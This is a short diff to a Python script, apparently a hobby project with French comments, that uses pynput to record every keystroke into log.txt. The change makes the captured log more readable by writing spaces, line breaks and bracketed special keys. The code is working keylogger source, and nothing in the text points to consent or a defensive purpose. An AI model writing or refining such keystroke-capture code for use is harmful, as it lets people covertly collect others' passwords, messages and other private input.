@@ -1,4 +1,4 @@
-from pynput import *
+from pynput import keyboard
 
 def on_press(key):
     """recupere les touches presses"""
@@ -7,8 +7,16 @@ def on_press(key):
         with open("log.txt","a") as f:
             f.write(f"{key.char}")
     except AttributeError:
-        with open("log.txt","a") as f:
-            f.write(f"{key}")
+        if key == keyboard.Key.space:
+            with open("log.txt","a") as f:
+                f.write(' ')
+        elif key == keyboard.Key.enter:
+            with open("log.txt","a") as f:
+                f.write("\n")
+        else:
+            with open("log.txt","a") as f:
+                f.write(f"[{key}]")
+
 
 def on_release(key):
     """enregistre la touche relachee"""
